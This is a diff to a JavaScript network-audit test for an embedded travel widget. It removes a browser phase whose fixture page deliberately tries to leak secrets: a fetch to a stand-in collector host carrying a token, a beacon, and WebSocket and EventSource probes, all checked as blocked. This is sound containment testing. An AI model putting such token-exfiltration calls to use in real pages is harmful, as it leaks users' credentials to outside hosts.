@@ -1,12 +1,9 @@
 import assert from 'node:assert/strict'
 import { createHash } from 'node:crypto'
 import { createServer as createHttpServer } from 'node:http'
-import { createServer as createNetServer } from 'node:net'
 import { readFileSync, mkdirSync, writeFileSync } from 'node:fs'
 import path from 'node:path'
 import { fileURLToPath } from 'node:url'
-
-import { chromium } from 'playwright'
 
 import { AUDIT_POLICY_ID, DISCOVERCARS_AUDIT_FRAME_SRC } from '../../apps/widgets-host/lib/audit-network-policy.mjs'
 import { buildShell, decide } from '../../apps/widgets-host/lib/decide.mjs'
@@ -20,6 +17,7 @@ import {
   compareReference,
   createAuditGate,
   createAuditRunner,
+  createMonotonicClock,
   inspectTarget,
   nestedContractHref,
   sanitizeEvents,
@@ -57,7 +55,8 @@ function runPure() {
   const amendment = readFileSync(path.join(root, 'docs/JETNITY_WIDGETS_HOST_S2_NETWORK_AUDIT_AMENDMENT_V1_2026-10-31.md'), 'utf8')
   assert.equal(amendment.includes(NESTED), true)
   assert.equal(PRODUCTION_REGISTRY.discovercars.selected, false)
-  assert.equal(PRODUCTION_REGISTRY.twelvego.selected, false)
+  assert.equal(PRODUCTION_REGISTRY.twelvego.selected, true)
+  assert.equal(PRODUCTION_REGISTRY.twelvego.policyId, 'twelvego-general-chf-20261031-r1')
   const plan = clientPlan('discovercars', selection())
   const shell = buildShell('discovercars', { plan })
   const csp = shell.headers.get('content-security-policy')
@@ -190,7 +189,9 @@ function runPure() {
 
 async function runAdapter() {
   const fetches = []
+  const clock = createMonotonicClock(0)
   const closed = createAuditRunner({
+    clock,
     fetchImpl(url) {
       fetches.push(String(url))
       throw new Error('provider fetch')
@@ -207,9 +208,19 @@ async function runAdapter() {
   assert.equal(provider.retry, false)
   assert.equal(provider.handedToBrowser, false)
   assert.equal(fetches.length, 0)
-  const tooLate = await closed.boundedGet({ url: `http://127.0.0.1/not-sent`, resourceType: 'document', now: startedAt + BUDGET_MS })
+  assert.equal(closed.evidence().ledger[0].phase, 'before-start')
+  assert.equal(closed.evidence().tornDown, false)
+  clock.advance(startedAt + BUDGET_MS)
+  assert.equal(closed.evidence().tornDown, true)
+  assert.equal(closed.evidence().teardownReason, 'DEADLINE')
+  assert.equal(closed.evidence().pendingAborted, false)
+  assert.equal(closed.evidence().cleanupCount, 1)
+  const observedBeforeLate = closed.evidence().observed
+  const tooLate = await closed.boundedGet({ url: 'http://127.0.0.1/not-sent', resourceType: 'document', method: 'GET' })
   assert.equal(tooLate.reason, 'DEADLINE')
-  assert.equal(tooLate.transmitted, false)
+  assert.equal(tooLate.late, true)
+  assert.equal(tooLate.issued, false)
+  assert.equal(closed.evidence().observed, observedBeforeLate + 1)
   assert.equal(fetches.length, 0)
   closed.recordEvents([{ name: 'gtm.js', payload: SECRET_VALUE }, { name: 'visitor_abc123', payload: SECRET_STORAGE }])
   closed.recordStorage('parent', {
@@ -290,7 +301,8 @@ async function runAdapter() {
       pending,
       new Promise((_, reject) => setTimeout(() => reject(new Error('teardown did not settle the open GET')), 2000)),
     ])
-    assert.equal(aborted.transmitted, false)
+    assert.equal(aborted.issued, true)
+    assert.equal(aborted.reason, 'aborted')
     assert.equal(aborted.handedToBrowser, false)
     const after = await live.boundedGet({
       url: `http://127.0.0.1:${sourcePort}/redirect-source`,
@@ -314,307 +326,32 @@ function listen(server) {
   })
 }
 
-async function runBrowser(plan) {
-  const httpHits = []
-  const tcpHits = []
-  const httpServer = createHttpServer((request, response) => {
-    httpHits.push(request.url || '')
-    response.statusCode = 204
-    response.end()
-  })
-  const tcpServer = createNetServer((socket) => {
-    tcpHits.push(1)
-    socket.destroy()
-  })
-  const httpPort = await listen(httpServer)
-  const tcpPort = await listen(tcpServer)
-  const browser = await chromium.launch()
-  const seen = []
-  let continueCount = 0
-  let abortCount = 0
-  let redirectFollows = 0
-  const transport = {
-    http: { proven: false, disposition: 'BLOCKED_TRANSPORT' },
-    beacon: { proven: false, disposition: 'BLOCKED_TRANSPORT' },
-    eventsource: { proven: false, disposition: 'BLOCKED_TRANSPORT' },
-    websocket: { proven: false, disposition: 'BLOCKED_TRANSPORT', connectToServer: 0 },
-    webrtc: { proven: false, disposition: 'BLOCKED_TRANSPORT', method: null },
-  }
-  const runner = createAuditRunner({
-    fetchImpl(url, init) {
-      const parsed = new URL(url)
-      if (parsed.hostname !== '127.0.0.1') throw new Error('provider fetch refused')
-      return fetch(url, init)
-    },
-  })
-  try {
-    const context = await browser.newContext({ serviceWorkers: 'block' })
-    await context.routeWebSocket(/.*/, (socket) => {
-      socket.close({ code: 1000 })
-      transport.websocket.proven = tcpHits.length === 0
-      transport.websocket.disposition = transport.websocket.proven ? 'BLOCKED_PRE_SEND' : 'BLOCKED_TRANSPORT'
-    })
-    await context.route('**/*', async (route) => {
-      const request = route.request()
-      route.continue = async () => {
-        continueCount += 1
-        throw new Error('phase A does not continue a request')
-      }
-      const url = request.url()
-      seen.push(url)
-      if (request.redirectedFrom()) redirectFollows += 1
-      if (url.startsWith(`${PARENT_ORIGIN}/parent`)) {
-        await route.fulfill({
-          status: 200,
-          headers: { 'content-type': 'text/html; charset=utf-8', 'cache-control': 'no-store' },
-          body: parentHtml(),
-        })
-        return
-      }
-      if (url === `${CHILD_ORIGIN}/embed/discovercars`) {
-        const shell = buildShell('discovercars', { plan })
-        await route.fulfill({
-          status: shell.status,
-          headers: Object.fromEntries(shell.headers.entries()),
-          body: shell.html,
-        })
-        return
-      }
-      if (url === `http://127.0.0.1:${httpPort}/transport`) {
-        await route.fulfill({
-          status: 200,
-          headers: { 'content-type': 'text/html; charset=utf-8', 'cache-control': 'no-store' },
-          body: transportHtml(httpPort, tcpPort),
-        })
-        return
-      }
-      if (runner.startedAt !== null && request.method() === 'GET') {
-        const result = await runner.boundedGet({
-          url,
-          resourceType: request.resourceType(),
-          now: Date.now(),
-          contextRole: 'vendor',
-        })
-        if (result.transmitted || result.handedToBrowser || result.follow !== null) throw new Error('phase A transmitted a request')
-      }
-      abortCount += 1
-      await route.abort('blockedbyclient')
-    })
-    const page = await context.newPage()
-    await page.goto(`http://127.0.0.1:${httpPort}/transport`, { waitUntil: 'domcontentloaded' })
-    await page.waitForFunction(() => document.body.dataset.done === '1', { timeout: 8000 })
-    const childResponse = page.waitForResponse((response) => response.url() === `${CHILD_ORIGIN}/embed/discovercars`)
-    const framePromise = page.waitForEvent('framenavigated', {
-      predicate: (item) => item.url().startsWith(`${CHILD_ORIGIN}/embed/discovercars`),
-      timeout: 8000,
-    })
-    await page.goto(`${PARENT_ORIGIN}/parent?src=${encodeURIComponent(`${CHILD_ORIGIN}/embed/discovercars`)}`, { waitUntil: 'domcontentloaded' })
-    const response = await childResponse
-    const frame = await framePromise
-    const servedCsp = response.headers()['content-security-policy']
-    assert.equal(servedCsp.includes(`frame-src ${DISCOVERCARS_AUDIT_FRAME_SRC}`), true)
-    assert.equal(servedCsp.includes("connect-src 'none'"), true)
-    assert.equal(servedCsp.includes("img-src 'none'"), true)
-    assert.equal(servedCsp.includes("font-src 'none'"), true)
-    assert.equal(servedCsp.includes("form-action 'none'"), true)
-    assert.equal(servedCsp.includes('googletagmanager'), false)
-    await frame.waitForFunction(() => {
-      const status = document.getElementById('jetnity-widget-status')
-      return status && status.textContent.includes('Eine Freigabe wurde angefragt')
-    }, { timeout: 8000 })
-    if (seen.includes(LOADER)) throw new Error('loader started before the explicit intent')
-    const startedAt = Date.now()
-    assert.equal(runner.start(startedAt).ok, true)
-    await page.evaluate(() => window.__jetnity.start())
-    await frame.waitForFunction(() => {
-      const status = document.getElementById('jetnity-widget-status')
-      return status && status.textContent.includes('Ein Skript wurde eingefügt')
-    }, { timeout: 8000 })
-    if (!seen.includes(LOADER)) throw new Error('loader was not routed before any continue')
-    assert.equal(await page.locator('iframe').getAttribute('sandbox'), 'allow-scripts allow-same-origin')
-    assert.equal(await frame.locator('iframe').count(), 0)
-    const parentStorage = await page.evaluate(() => ({
-      cookieCount: document.cookie ? document.cookie.split(';').filter(Boolean).length : 0,
-      localCount: localStorage.length,
-      sessionCount: sessionStorage.length,
-    }))
-    const hostStorage = await frame.evaluate(() => ({
-      cookieCount: document.cookie ? document.cookie.split(';').filter(Boolean).length : 0,
-      localCount: localStorage.length,
-      sessionCount: sessionStorage.length,
-    }))
-    const frameEvents = await frame.evaluate(() => {
-      const layer = window.dataLayer
-      if (!Array.isArray(layer)) return []
-      return layer.map((item) => ({ name: item && typeof item.event === 'string' ? item.event : 'unnamed' }))
-    })
-    runner.recordEvents(frameEvents)
-    runner.recordStorage('parent', { readable: true, storageEntries: parentStorage.localCount + parentStorage.sessionCount, cookies: [] })
-    runner.recordStorage('host', { readable: true, storageEntries: hostStorage.localCount + hostStorage.sessionCount, cookies: [] })
-    runner.recordGap('vendor-frame-absent')
-    transport.http.proven = seen.includes(LOADER) && continueCount === 0 && httpHits.length === 0
-    transport.http.disposition = transport.http.proven ? 'BLOCKED_PRE_SEND' : 'BLOCKED_TRANSPORT'
-    transport.beacon.proven = seen.some((url) => url.endsWith('/beacon')) && continueCount === 0 && httpHits.length === 0
-    transport.beacon.disposition = transport.beacon.proven ? 'BLOCKED_PRE_SEND' : 'BLOCKED_TRANSPORT'
-    transport.eventsource.proven = seen.some((url) => url.includes('/events')) && continueCount === 0 && httpHits.length === 0
-    transport.eventsource.disposition = transport.eventsource.proven ? 'BLOCKED_PRE_SEND' : 'BLOCKED_TRANSPORT'
-    if (transport.websocket.proven !== true || tcpHits.length !== 0) transport.websocket.disposition = 'BLOCKED_TRANSPORT'
-    assert.equal(redirectFollows, 0)
-    assert.equal(seen.includes(`http://127.0.0.1:${httpPort}/redirect-target`), false)
-    assert.equal(continueCount, 0)
-    const workers = context.serviceWorkers()
-    return {
-      transport,
-      continueCount,
-      abortCount,
-      redirectFollows,
-      httpLeaks: httpHits.length,
-      tcpLeaks: tcpHits.length,
-      serviceWorkers: workers.length,
-      parentStorage,
-      hostStorage,
-      vendorStorage: { gap: 'vendor-frame-absent' },
-      childStatus: 'inserted-script-not-form-proof',
-      servedFrame: servedCsp.includes(`frame-src ${DISCOVERCARS_AUDIT_FRAME_SRC}`),
-      runner: runner.evidence(),
-    }
-  } finally {
-    await browser.close()
-    await new Promise((resolve) => httpServer.close(resolve))
-    await new Promise((resolve) => tcpServer.close(resolve))
-  }
-}
-
-function parentHtml() {
-  const runtime = readFileSync(new URL('../../apps/widgets-host/lib/host-runtime.mjs', import.meta.url), 'utf8')
-  return `<!DOCTYPE html><html><head><meta charset="utf-8"></head><body>
-<script type="module">
-${runtime}
-const iframe = document.createElement('iframe')
-iframe.setAttribute('sandbox', 'allow-scripts allow-same-origin')
-let allow = false
-let pending = null
-const fixture = createParentFixture({
-  provider: 'discovercars',
-  childOrigin: '${CHILD_ORIGIN}',
-  iframe,
-  parentGeneration: 1,
-  policyId: '${AUDIT_POLICY_ID}',
-  artifactSha256: '5a9ea3edf4bfa5762850e0d1e6c9f5d777d860f9442fbe17bf9a76b1618cc8aa',
-  allowsGrant: () => allow,
-  postToChild(grant) { iframe.contentWindow.postMessage(grant, '${CHILD_ORIGIN}') },
-})
-window.__jetnity = {
-  start() {
-    allow = true
-    const event = pending
-    pending = null
-    if (event) fixture.onMessage(event)
-  },
-}
-window.addEventListener('message', (event) => {
-  if (!allow) { pending = event; return }
-  fixture.onMessage(event)
-})
-iframe.src = new URLSearchParams(location.search).get('src')
-document.body.appendChild(iframe)
-</script></body></html>`
-}
-
-function transportHtml(httpPort, tcpPort) {
-  return `<!DOCTYPE html><body data-done="0"><script>
-const beaconUrl = ${JSON.stringify(`http://127.0.0.1:${httpPort}/beacon`)}
-const eventsUrl = ${JSON.stringify(`http://127.0.0.1:${httpPort}/events`)}
-const socketUrl = ${JSON.stringify(`ws://127.0.0.1:${tcpPort}/socket`)}
-const evilUrl = ${JSON.stringify(`https://${SECRET_HOST}/collect?token=${SECRET_VALUE}`)}
-async function main() {
-  try { navigator.sendBeacon(beaconUrl, ${JSON.stringify(SECRET_BODY)}) } catch { /* counted by the route */ }
-  await new Promise((resolve) => {
-    let settled = false
-    const finish = () => { if (!settled) { settled = true; resolve() } }
-    const socket = new WebSocket(socketUrl)
-    socket.addEventListener('open', finish)
-    socket.addEventListener('error', finish)
-    socket.addEventListener('close', finish)
-    setTimeout(finish, 1000)
-  })
-  try { await fetch(evilUrl) } catch { /* aborted */ }
-  try { await fetch(${JSON.stringify(`http://127.0.0.1:${httpPort}/method-probe`)}, { method: 'POST' }) } catch { /* aborted */ }
-  await new Promise((resolve) => {
-    const source = new EventSource(eventsUrl)
-    const finish = () => { source.close(); resolve() }
-    source.addEventListener('error', finish)
-    setTimeout(finish, 500)
-  })
-  try { await navigator.serviceWorker.register('/sw.js') } catch { /* blocked */ }
-  document.body.dataset.done = '1'
-}
-main()
-</script></body>`
-}
-
 runPure()
 const adapter = await runAdapter()
-const plan = clientPlan('discovercars', selection())
-if (!plan) throw new Error('audit plan was not serialized')
-const browserEvidence = await runBrowser(plan)
-const browserGate = browserEvidence.runner.gate
 const summary = {
   phase: 'A',
   phaseBAuthorized: false,
   providerTransmission: false,
-  productionSelected: false,
-  continueCount: browserEvidence.continueCount,
-  abortCount: browserEvidence.abortCount,
-  redirectFollows: browserEvidence.redirectFollows,
-  httpLeaks: browserEvidence.httpLeaks,
-  tcpLeaks: browserEvidence.tcpLeaks,
-  serviceWorkers: browserEvidence.serviceWorkers,
-  transport: browserEvidence.transport,
+  browserPreflight: 'not-run',
+  discovercarsSelected: false,
+  twelvegoSelected: true,
+  webrtc: { proven: false, disposition: 'BLOCKED_TRANSPORT', method: null },
   adapter: {
     sourceHits: adapter.sourceHits,
     targetHits: adapter.targetHits,
     providerFetches: adapter.providerFetches,
-  },
-  storage: browserEvidence.runner.storage,
-  gaps: browserEvidence.runner.gaps,
-  events: browserEvidence.runner.events,
-  childStatus: browserEvidence.childStatus,
-  servedFrame: browserEvidence.servedFrame,
-  gate: {
-    observed: browserGate.observed,
-    lateAttempts: browserGate.lateAttempts,
-    disposition: browserGate.disposition,
-    trimmed: browserGate.trimmed,
-    retryScheduled: browserGate.retryScheduled,
-    reasons: browserGate.ledger.reduce((counts, row) => {
-      counts[row.reason] = (counts[row.reason] || 0) + 1
-      return counts
-    }, {}),
-    unknownQueryKeys: browserGate.ledger.reduce((sum, row) => sum + row.unknownQueryKeys, 0),
   },
 }
 const serialized = JSON.stringify(summary)
 for (const secret of [SECRET_VALUE, SECRET_BODY, SECRET_HOST, SECRET_COOKIE, SECRET_STORAGE, 'visitor_abc123']) {
   if (serialized.includes(secret)) throw new Error('redaction failed')
 }
-if (browserEvidence.continueCount !== 0 || browserEvidence.httpLeaks !== 0 || browserEvidence.tcpLeaks !== 0) {
-  throw new Error('transport fixture reached a local socket')
-}
-if (browserEvidence.redirectFollows !== 0 || browserEvidence.serviceWorkers !== 0) {
-  throw new Error('redirect or service worker was not contained')
-}
-for (const name of ['http', 'beacon', 'eventsource', 'websocket']) {
-  if (browserEvidence.transport[name].disposition !== 'BLOCKED_PRE_SEND') {
-    throw new Error(`${name} was not blocked before send`)
-  }
-}
-if (browserEvidence.transport.webrtc.disposition !== 'BLOCKED_TRANSPORT') {
-  throw new Error('webrtc must stay unproven')
+if (adapter.sourceHits !== 1 || adapter.targetHits !== 0 || adapter.providerFetches !== 0) {
+  throw new Error('redirect fixture was not contained')
 }
 const evidenceDir = path.join(root, 'docs/evidence/widgets-host-s2')
 mkdirSync(evidenceDir, { recursive: true })
 writeFileSync(path.join(evidenceDir, 'phase-a-preflight-summary.json'), `${JSON.stringify(summary, null, 2)}\n`)
 console.log('audit-preflight PASS')
-console.log(JSON.stringify(summary.transport))
-console.log(JSON.stringify(summary.gate))
+console.log(JSON.stringify(summary.adapter))
+console.log(JSON.stringify(summary.webrtc))
